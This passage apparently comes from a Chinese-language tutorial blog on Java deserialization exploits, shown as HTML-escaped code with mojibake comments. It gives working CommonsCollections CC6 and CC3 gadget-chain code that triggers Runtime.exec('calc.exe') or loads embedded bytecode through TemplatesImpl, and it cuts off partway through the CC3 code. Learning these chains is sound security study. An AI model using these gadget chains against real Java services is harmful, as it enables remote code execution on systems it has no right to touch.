&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span> &lt;span style="color:#75715e">// é¿å…ç”Ÿæˆpayloadæ—¶è§¦å‘RCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// å¾—åˆ°è¢«è£…é¥°åçš„æ¶æ„LazyMapå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// ä¸ºäº†è°ƒç”¨TiedMapEntry#hashCode æ–°å»ºHashMap å¹¶æŠŠtmeä½œä¸ºkey
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// putä¹Ÿä¼šè°ƒç”¨hash(key) é¿å…å¯¹åé¢getçš„å½±å“
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ›¿æ¢çœŸæ­£çš„transformers
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// åºåˆ—åŒ–éƒ¨åˆ†
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è§¦å‘
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é€»è¾‘æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œæ¯ä¸€éƒ¨åˆ†ä¹Ÿéƒ½æ¯”è¾ƒå¥½æ‡‚&lt;/p>
&lt;h2 id="cc38u71">CC3(&amp;lt;8u71&lt;/h2>
&lt;p>ç”±äº&lt;code>TemplatesImpl&lt;/code>å¯ä»¥ç›´æ¥æ§åˆ¶å­—èŠ‚ç ï¼ˆå³javaä»£ç ï¼‰ï¼Œæ‰€ä»¥å°è¯•ç»“åˆCC1 demoå’Œæ‰§è¡Œå­—èŠ‚ç çš„éƒ¨åˆ†å°±å¯ä»¥æ„é€ å‡ºCC3ï¼ˆçš„ä¸€éƒ¨åˆ†ï¼‰äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†&lt;code>InvokerTransformer&lt;/code>æ‰§è¡Œçš„æ–¹æ³•ä»æ˜¾å¼çš„rceï¼ˆgetRuntime.execï¼‰å˜ä¸ºè°ƒç”¨&lt;code>TemplatesImpl::newTransformer&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3mini&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
